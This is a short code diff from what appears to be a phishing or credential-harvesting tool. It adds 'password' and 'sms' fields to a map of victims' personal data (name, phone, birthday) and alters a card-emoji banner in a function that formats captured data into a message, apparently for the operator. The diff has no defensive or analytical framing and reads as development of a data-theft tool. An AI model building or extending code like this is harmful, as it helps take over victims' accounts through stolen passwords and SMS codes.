@@ -11,13 +11,14 @@ fields = {
     'full_name': '🎭',
     'phone': '📞',
     'birthday': '📅',
-    'code': '📲'
+    'password': '📲',
+    'sms': '📲'
 }
 
 
 def send_message(session):
     message = '###################\n' \
-              '#### 💳 B__A__N__N__N__A ~~ _I_D 💳 ####\n' \
+              '#### 💳 B__A__N__N__A__N__A ~~ N_O 💳 ####\n' \
               '###################\n\n'
 
     if session.__dict__.get('_session_cache'):
